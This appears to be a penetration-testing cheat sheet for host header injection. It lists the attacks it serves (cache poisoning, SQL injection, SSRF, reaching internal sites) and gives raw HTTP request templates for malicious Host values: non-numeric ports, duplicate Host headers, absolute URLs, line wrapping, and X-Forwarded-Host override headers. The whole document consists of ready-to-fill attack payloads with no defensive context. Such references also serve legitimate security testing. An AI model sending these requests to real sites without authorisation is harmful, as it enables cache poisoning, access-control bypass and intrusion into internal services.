### Attack vectors for host header injection
```
web cache poisoning
SQLi
access restricted functionality (internal websites)
SSRF
```

### Supply a non-numeric port
```
GET /<path> HTTP/1.1
Host: <targetDomain>:<evilStuff>
```

### Send duplicate host header
```
GET /<path> HTTP/1.1
Host: <targetDomain>
Host: <evilStuff>
```

### Supply absolute URL
```
GET https://<targetDomain> HTTP/1.1
Host: <evilStuff>
```

### Line wrapping
```
GET /<path>HTTP/1.1
 Host: <evilStuff>
Host: <targetDomain>
```

### Host override headers (alternative: X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded)
```
GET /<path> HTTP/1.1
Host: <targetDomain>
X-Forwarded-Host: <evilStuff>
```

